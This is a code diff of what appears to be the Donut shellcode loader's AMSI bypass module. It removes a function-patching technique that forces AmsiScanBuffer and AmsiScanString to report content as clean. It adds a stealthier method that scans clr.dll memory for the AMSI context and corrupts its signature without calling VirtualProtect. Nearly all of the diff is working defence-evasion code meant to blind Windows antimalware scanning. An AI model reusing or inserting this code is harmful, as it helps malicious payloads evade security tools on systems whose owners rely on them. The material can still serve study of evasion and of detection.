@@ -31,90 +31,66 @@
 
 #include "bypass.h"
 
-
 #if defined(BYPASS_AMSI_A)
-
-// Custom stub that returns S_OK and *result = AMSI_RESULT_CLEAN
-// We force noinline to prevent the compiler from merging this with other functions
-__declspec(noinline)
-HRESULT WINAPI CustomAmsiScanBuffer(
-    HAMSICONTEXT amsiContext,
-    PVOID buffer,
-    ULONG length,
-    LPCWSTR contentName,
-    HAMSISESSION amsiSession,
-    AMSI_RESULT *result)
-{
-    // Set result to CLEAN (0)
-    if(result != NULL) {
-        *result = AMSI_RESULT_CLEAN;
-    }
-    return S_OK;
-}
-
-// Dummy end function to calculate stub length
-// The body MUST differ from other functions or MSVC will deduplicate it
-__declspec(noinline)
-int CustomAmsiScanBufferEnd(int x, int y, int z) {
-    return (x ^ y) + (z * 3);
-}
-
-// Same for AmsiScanString
-__declspec(noinline)
-HRESULT WINAPI CustomAmsiScanString(
-    HAMSICONTEXT amsiContext,
-    LPCWSTR string,
-    LPCWSTR contentName,
-    HAMSISESSION amsiSession,
-    AMSI_RESULT *result)
-{
-    if(result != NULL) {
-        *result = AMSI_RESULT_CLEAN;
-    }
-    return S_OK;
-}
-
-__declspec(noinline)
-int CustomAmsiScanStringEnd(int x, int y) {
-    return (x | 0x41) - y;
-}
-
+// AMSI bypass via CLR context corruption
+// Scans clr.dll writable sections for heap pointers to the AMSI context
+// Corrupts the signature WITHOUT calling VirtualProtect
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-    HMODULE dll;
-    DWORD len, op, t;
-    LPVOID cs;
+    LPVOID clr;
+    PIMAGE_DOS_HEADER dos;
+    PIMAGE_NT_HEADERS nt;
+    PIMAGE_SECTION_HEADER sh;
+    DWORD i, j;
+    PBYTE ds;
+    MEMORY_BASIC_INFORMATION mbi;
+    _PHAMSICONTEXT ctx;
+    BOOL disabled = FALSE;
 
-    // Resolve amsi.dll via PEB (does NOT call LoadLibraryA)
-    dll = xGetLibAddress(inst, inst->amsi);
-    if(dll == NULL) return TRUE;  // Not present = nothing to do
+    // Get base of clr.dll. If not present, this isn't a .NET process yet.
+    clr = inst->api.GetModuleHandleA(inst->clr);
+    if(clr == NULL) return FALSE;
 
-    // --- Patch AmsiScanBuffer ---
-    cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
-    if(cs == NULL) return FALSE;
+    dos = (PIMAGE_DOS_HEADER)clr;
+    nt = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);
+    sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader +
+         nt->FileHeader.SizeOfOptionalHeader);
 
-    len = (ULONG_PTR)CustomAmsiScanBufferEnd - (ULONG_PTR)CustomAmsiScanBuffer;
-    if((int)len <= 0) return FALSE;  // Compiler reordered functions
+    // Scan every writable section of clr.dll
+    for(i = 0; i < nt->FileHeader.NumberOfSections && !disabled; i++) {
+        if(sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+            ds = RVA2VA(PBYTE, clr, sh[i].VirtualAddress);
 
-    if(!inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READWRITE, &op))
-        return FALSE;
+            for(j = 0;
+                j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR);
+                j += sizeof(ULONG_PTR))
+            {
+                ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
 
-    Memcpy(cs, ADR(PCHAR, CustomAmsiScanBuffer), len);
-    inst->api.VirtualProtect(cs, len, op, &t);
+                // Validate pointer is readable before dereferencing
+                if(inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi)) != sizeof(mbi))
+                    continue;
 
-    // --- Patch AmsiScanString ---
-    cs = xGetProcAddress(inst, dll, inst->amsiScanStr, 0);
-    if(cs == NULL) return FALSE;
+                // Must be committed, private heap memory, read-write
+                if((mbi.State == MEM_COMMIT) &&
+                   (mbi.Type == MEM_PRIVATE) &&
+                   (mbi.Protect == PAGE_READWRITE))
+                {
+                    ctx = (_PHAMSICONTEXT)ptr;
 
-    len = (ULONG_PTR)CustomAmsiScanStringEnd - (ULONG_PTR)CustomAmsiScanString;
-    if((int)len <= 0) return FALSE;
-
-    if(!inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READWRITE, &op))
-        return FALSE;
-
-    Memcpy(cs, ADR(PCHAR, CustomAmsiScanString), len);
-    inst->api.VirtualProtect(cs, len, op, &t);
-
-    return TRUE;
+                    // Check if this structure starts with "AMSI" signature
+                    // inst->amsi is a hashed string, but in the instance it resolves to "AMSI"
+                    if(ctx->Signature == *(PDWORD)inst->amsi) {
+                        // CORRUPT THE SIGNATURE
+                        // This page is already R/W. No VirtualProtect needed.
+                        ctx->Signature++;
+                        disabled = TRUE;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    return disabled;
 }
 #endif
 
